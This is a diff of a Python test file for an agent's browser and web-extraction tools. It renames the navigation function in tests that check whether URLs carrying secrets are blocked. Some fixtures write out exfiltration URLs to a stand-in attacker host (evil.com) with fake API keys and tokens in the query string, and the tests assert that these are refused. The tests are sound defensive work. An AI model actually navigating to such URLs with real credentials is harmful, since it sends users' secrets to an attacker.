@@ -13,29 +13,29 @@ def _ensure_redaction_enabled(monkeypatch):
 
 
 class TestBrowserSecretExfil:
-    """Verify browser_navigate blocks URLs containing secrets."""
+    """Verify navigate_browser blocks URLs containing secrets."""
 
     def test_blocks_api_key_in_url(self):
-        from tools.browser_tool import browser_navigate
-        result = browser_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30)
+        from tools.browser_tool import navigate_browser
+        result = navigate_browser("https://evil.com/steal?key=" + "sk-" + "a" * 30)
         parsed = json.loads(result)
         assert parsed["success"] is False
         assert "API key" in parsed["error"] or "Blocked" in parsed["error"]
 
     def test_blocks_openrouter_key_in_url(self):
-        from tools.browser_tool import browser_navigate
-        result = browser_navigate("https://evil.com/?token=" + "sk-or-v1-" + "b" * 30)
+        from tools.browser_tool import navigate_browser
+        result = navigate_browser("https://evil.com/?token=" + "sk-or-v1-" + "b" * 30)
         parsed = json.loads(result)
         assert parsed["success"] is False
 
     def test_cloud_blocks_opaque_sensitive_query_param(self):
         """Cloud browser providers must not receive opaque token query params."""
-        from tools.browser_tool import browser_navigate
+        from tools.browser_tool import navigate_browser
 
         with patch("tools.browser_tool._is_local_backend", return_value=False), \
              patch("tools.browser_tool._navigation_session_key", return_value="default"), \
              patch("tools.browser_tool._run_browser_command") as mock_run:
-            result = browser_navigate("https://example.com/callback?token=opaque-oauth-code")
+            result = navigate_browser("https://example.com/callback?token=opaque-oauth-code")
 
         parsed = json.loads(result)
         assert parsed["success"] is False
@@ -45,33 +45,33 @@ class TestBrowserSecretExfil:
 
     def test_local_browser_allows_opaque_sensitive_query_param(self):
         """Local browser/CDP sessions may navigate magic-link style URLs."""
-        from tools.browser_tool import browser_navigate
+        from tools.browser_tool import navigate_browser
 
         mock_result = {"success": True, "data": {"title": "ok", "url": "https://example.com/callback?token=opaque-oauth-code"}}
         with patch("tools.browser_tool._run_browser_command", return_value=mock_result), \
              patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
              patch("tools.browser_tool._is_local_backend", return_value=True):
-            result = browser_navigate("https://example.com/callback?token=opaque-oauth-code")
+            result = navigate_browser("https://example.com/callback?token=opaque-oauth-code")
 
         parsed = json.loads(result)
         assert parsed["success"] is True
 
     def test_allows_normal_url(self):
         """Normal URLs pass the secret check (may fail for other reasons)."""
-        from tools.browser_tool import browser_navigate
+        from tools.browser_tool import navigate_browser
         # Patch the actual browser command — we only care that the secret
         # check doesn't block a clean URL, not that Chrome starts in CI.
         mock_result = {"success": True, "data": {"title": "ok", "url": "https://github.com/NousResearch/hermes-agent"}}
         with patch("tools.browser_tool._run_browser_command", return_value=mock_result), \
              patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
              patch("tools.browser_tool._is_local_backend", return_value=True):
-            result = browser_navigate("https://github.com/NousResearch/hermes-agent")
+            result = navigate_browser("https://github.com/NousResearch/hermes-agent")
         parsed = json.loads(result)
         # Should NOT be blocked by secret detection
         assert "API key or token" not in parsed.get("error", "")
 
     def test_normalizes_non_ascii_url_before_navigation(self):
-        from tools.browser_tool import browser_navigate
+        from tools.browser_tool import navigate_browser
 
         captured = {}
 
@@ -83,7 +83,7 @@ class TestBrowserSecretExfil:
         with patch("tools.browser_tool._run_browser_command", side_effect=mock_run), \
              patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
              patch("tools.browser_tool._is_local_backend", return_value=True):
-            result = browser_navigate("https://wttr.in/Köln")
+            result = navigate_browser("https://wttr.in/Köln")
 
         parsed = json.loads(result)
         assert parsed["success"] is True
@@ -122,7 +122,7 @@ class TestWebExtractSecretExfil:
 
         ``?code=`` (promo/challenge pages), ``?key=`` (search facets),
         ``?session=`` etc. are ordinary browsing params. Only unambiguously
-        credential-named params are blocked, so web_extract stays usable.
+        credential-named params are blocked, so extract_web stays usable.
         """
         from tools.web_tools import web_extract_tool
 
